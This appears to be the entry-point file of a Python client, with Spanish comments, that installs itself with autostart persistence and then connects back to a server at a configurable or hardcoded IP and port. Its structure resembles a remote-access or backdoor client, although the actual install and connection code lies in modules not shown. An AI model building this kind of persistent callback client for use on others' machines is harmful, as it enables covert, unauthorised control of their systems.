# client/__main__.py
from client.client import Client
from client.setup import ClientSetup


def init(persistence: bool = True):
    SERVER_HOST = '127.0.0.1'  # Cambia a la IP del servidor
    SERVER_PORT = 8080  # Puerto del servidor
    client_setup = ClientSetup(__file__)
    if client_setup.detect_existing_installation().get('installed'):
         pass
    else:
        client_setup.install(create_autostart=persistence)  # Custom installation

    client1 = Client(SERVER_HOST, SERVER_PORT)
    client1.connect(SERVER_HOST, SERVER_PORT)


if __name__ == "__main__":
    # init()
    client1 = Client('192.168.1.134', 8080)
    client1.connect()
